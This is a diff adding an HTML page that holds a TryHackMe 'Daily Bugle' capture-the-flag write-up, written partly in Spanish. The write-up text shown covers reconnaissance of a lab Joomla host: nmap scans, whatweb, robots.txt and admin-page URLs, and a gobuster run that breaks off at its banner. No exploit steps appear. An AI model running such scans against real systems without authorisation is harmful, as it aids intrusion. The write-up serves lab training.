@@ -1,0 +1,1646 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../cyberheroes/">
+      
+      
+        <link rel="next" href="../dombasedattacks/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Daily Bugle - rdrg0x</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#daily-bugle" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="rdrg0x" class="md-header__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            rdrg0x
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Daily Bugle
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    rdrg0x
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackme
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackme
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Alfred
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADBasicEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Basic Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../atlas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attackingkerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attacktivedirectory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacktive Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic Pentesting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blaster/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blaster
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blueprint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blueprint
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bolt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bolt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../brainpan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainpan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../brainstorm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brainstorm
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chillhack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chill Hack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../colddboxeasy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ColddBox Easy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cyberheroes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CyberHeroes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Daily Bugle
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Daily Bugle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FUZZ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dombasedattacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-Based Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../elbandito/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    El Bandito
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FUZZ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../HackTheBox/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../alfred/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    TryHackme
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:joomla" class="md-tag">joomla</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="daily-bugle">Daily Bugle<a class="headerlink" href="#daily-bugle" title="Permanent link">&para;</a></h1>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<p>Scan de puertos abiertos</p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.201.87.38<span class="w"> </span>-oG<span class="w"> </span>allPorts<span class="w">  </span>
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-09-24<span class="w"> </span><span class="m">16</span>:55<span class="w"> </span>-03
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.201.87.38
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.28s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65144</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>,<span class="w"> </span><span class="m">388</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+Some<span class="w"> </span>closed<span class="w"> </span>ports<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>reported<span class="w"> </span>as<span class="w"> </span>filtered<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>--defeat-rst-ratelimit
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http
+<span class="m">3306</span>/tcp<span class="w"> </span>open<span class="w">  </span>mysql
+</code></pre></div>
+<p>Enumeración de puertos abiertos </p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p22,80,3306<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.201.87.38<span class="w"> </span>-oN<span class="w"> </span>targed.txt<span class="w">            </span>
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-09-24<span class="w"> </span><span class="m">16</span>:57<span class="w"> </span>-03
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.201.87.38
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.28s<span class="w"> </span>latency<span class="o">)</span>.
+
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.4<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">68</span>:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.6<span class="w"> </span><span class="o">((</span>CentOS<span class="o">)</span><span class="w"> </span>PHP/5.6.40<span class="o">)</span>
+<span class="p">|</span>_http-generator:<span class="w"> </span>Joomla!<span class="w"> </span>-<span class="w"> </span>Open<span class="w"> </span>Source<span class="w"> </span>Content<span class="w"> </span>Management
+<span class="p">|</span>_http-title:<span class="w"> </span>Home
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.6<span class="w"> </span><span class="o">(</span>CentOS<span class="o">)</span><span class="w"> </span>PHP/5.6.40
+<span class="p">|</span><span class="w"> </span>http-robots.txt:<span class="w"> </span><span class="m">15</span><span class="w"> </span>disallowed<span class="w"> </span>entries<span class="w"> </span>
+<span class="p">|</span><span class="w"> </span>/joomla/administrator/<span class="w"> </span>/administrator/<span class="w"> </span>/bin/<span class="w"> </span>/cache/<span class="w"> </span>
+<span class="p">|</span><span class="w"> </span>/cli/<span class="w"> </span>/components/<span class="w"> </span>/includes/<span class="w"> </span>/installation/<span class="w"> </span>/language/<span class="w"> </span>
+<span class="p">|</span>_/layouts/<span class="w"> </span>/libraries/<span class="w"> </span>/logs/<span class="w"> </span>/modules/<span class="w"> </span>/plugins/<span class="w"> </span>/tmp/
+<span class="m">3306</span>/tcp<span class="w"> </span>open<span class="w">  </span>mysql<span class="w">   </span>MariaDB<span class="w"> </span><span class="m">10</span>.3.23<span class="w"> </span>or<span class="w"> </span>earlier<span class="w"> </span><span class="o">(</span>unauthorized<span class="o">)</span>
+</code></pre></div>
+<h3 id="http">HTTP<a class="headerlink" href="#http" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>whatweb<span class="w"> </span>http://10.201.87.38<span class="w"> </span>
+http://10.201.87.38<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Apache<span class="o">[</span><span class="m">2</span>.4.6<span class="o">]</span>,<span class="w"> </span>Bootstrap,<span class="w"> </span>Cookies<span class="o">[</span>eaa83fe8b963ab08ce9ab7d4a798de05<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>CentOS<span class="o">][</span>Apache/2.4.6<span class="w"> </span><span class="o">(</span>CentOS<span class="o">)</span><span class="w"> </span>PHP/5.6.40<span class="o">]</span>,<span class="w"> </span>HttpOnly<span class="o">[</span>eaa83fe8b963ab08ce9ab7d4a798de05<span class="o">]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.201.87.38<span class="o">]</span>,<span class="w"> </span>JQuery,<span class="w"> </span>MetaGenerator<span class="o">[</span>Joomla!<span class="w"> </span>-<span class="w"> </span>Open<span class="w"> </span>Source<span class="w"> </span>Content<span class="w"> </span>Management<span class="o">]</span>,<span class="w"> </span>PHP<span class="o">[</span><span class="m">5</span>.6.40<span class="o">]</span>,<span class="w"> </span>PasswordField<span class="o">[</span>password<span class="o">]</span>,<span class="w"> </span>Script<span class="o">[</span>application/json<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span>Home<span class="o">]</span>,<span class="w"> </span>X-Powered-By<span class="o">[</span>PHP/5.6.40<span class="o">]</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image.png" /></p>
+<div class="highlight"><pre><span></span><code>http://10.201.87.38/robots.txt
+</code></pre></div>
+<p><img alt="alt text" src="img/image-1.png" /></p>
+<div class="highlight"><pre><span></span><code>http://10.201.87.38/administrator/
+</code></pre></div>
+<p><img alt="alt text" src="img/image-2.png" /></p>
+<h3 id="fuzz">FUZZ<a class="headerlink" href="#fuzz" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.201.87.38<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">100</span><span class="w"> </span>-x<span class="w"> </span>txt,php,js<span class="w">                </span>
+<span class="o">===============================================================</span>
+Gobuster<span class="w"> </span>v3.8
+by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
